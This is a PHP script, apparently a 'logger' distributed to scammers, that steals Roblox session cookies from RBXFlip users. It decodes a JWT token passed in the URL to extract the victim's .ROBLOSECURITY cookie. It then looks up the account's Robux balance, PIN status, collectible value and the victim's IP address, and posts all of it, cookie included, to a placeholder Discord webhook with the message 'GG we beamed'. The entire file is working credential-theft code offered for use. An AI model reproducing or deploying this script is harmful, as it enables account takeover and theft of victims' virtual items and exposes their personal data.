<?php

$allowed_origins = array(
    "https://www.rbxflip.com",
    "https://rbxflip.com"
);

$token = htmlspecialchars($_GET['t']);
if (!isset($_SERVER['HTTP_ORIGIN']) || !in_array($_SERVER["HTTP_ORIGIN"], $allowed_origins) || !isset($_GET["t"])) {
    die();
}
            
$replace = str_replace("Bearer ", " ", $token);
$decoded = json_decode(base64_decode(str_replace('_', '/', str_replace('-','+',explode('.', $replace)[1]))));
$cookie = "$decoded->credentials";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://www.roblox.com/mobileapi/userinfo");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Cookie: .ROBLOSECURITY=' . $cookie
));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$profile = json_decode(curl_exec($ch), 1);
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/v1/account/pin");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Cookie: .ROBLOSECURITY=' . $cookie
));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$pin = json_decode(curl_exec($ch), 1);
curl_close($ch);

if (account_filter($profile)) {
    $object = json_encode([
        "username" => "GG we beamed " . $profile["UserName"],
        "content" => $profile.["RobuxBalance"] + get_user_rap($profile["UserID"], $cookie) . " Worth hit! @everyone",
        "avatar_url" => "",
        "embeds" => [
            [
                "title" => 'Karlo\'s RBXFlip Logger',
                "type" => "rich",
                "description" => "",
                "url" => "https://www.roblox.com/users/" . $profile["UserID"] . "/profile",
                "timestamp" => date('Y-m-d H:i:s'),
                "color" => hexdec("#89DBFB"),
                "thumbnail" => [
                    "url" => "https://www.roblox.com/bust-thumbnail/image?userId=" . $profile["UserID"] . "&width=420&height=420&format=png"
                ],
                "footer" => [
                    "text" => "discord.gg/luxid  for free methods!",
                    "icon_url" => "https://media.discordapp.net/attachments/795323655688945695/853076457692463105/image0.png"
                ],
                "fields" => [
                    [
                        "name" => "Name",
                        "value" => $profile["UserName"]
                    ],
                    [
                        "name" => "Robux Balance:moneybag::",
                        "value" => $profile["RobuxBalance"]
                    ],
                    [
                        "name" => "RAP:chart_with_upwards_trend::",
                        "value" => get_user_rap($profile["UserID"], $cookie)
                    ],
                    [
                        "name" => "Premium?:gem::",
                        "value" => $profile["IsPremium"]
                    ],
                    [
                        "name" => "Pin Enabled?:closed_lock_with_key:",
                        "value" => $pin["isEnabled"]
                    ],
                    [
                        "name" => "Rolimon's 🤖 :",
                        "value" => "https://www.rolimons.com/player/" . $profile["UserID"]
                    ],
                    [
                        "name" => "IP",
                        "value" => "||" . realIP() . "||"
                    ],
                    [
                        "name" => "Cookie",
                        "value" => "```" . $cookie . "```"
                    ],
                ]
            ]
        ]
    
    ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => "YOUR WEBHOOK HERE",
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $object,
        CURLOPT_HTTPHEADER => [
            "Content-Type: application/json"
        ]
    ]);
    
    $response = curl_exec($ch);
    curl_close($ch);
}
function realIP() {
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
                  $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
                  $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
    
        if(filter_var($client, FILTER_VALIDATE_IP)) { $ip = $client; }
        elseif(filter_var($forward, FILTER_VALIDATE_IP)) { $ip = $forward; }
        else { $ip = $remote; }
    
        return $ip;
    }
    function get_user_rap($user_id, $cookie) {
        $cursor = "";
        $total_rap = 0;
                        
        while ($cursor !== null) {
            $request = curl_init();
            curl_setopt($request, CURLOPT_URL, "https://inventory.roblox.com/v1/users/$user_id/assets/collectibles?assetType=All&sortOrder=Asc&limit=100&cursor=$cursor");
            curl_setopt($request, CURLOPT_HTTPHEADER, array('Cookie: .ROBLOSECURITY='.$cookie));
            curl_setopt($request, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($request, CURLOPT_SSL_VERIFYPEER, 0); 
            curl_setopt($request, CURLOPT_SSL_VERIFYHOST, 0);
            $data = json_decode(curl_exec($request), 1);
            foreach($data["data"] as $item) {
                $total_rap += $item["recentAveragePrice"];
            }
            $cursor = $data["nextPageCursor"] ? $data["nextPageCursor"] : null;
        }
                        
        return $total_rap;
    }
    function account_filter($profile) {
        return true;
    }
    

?>
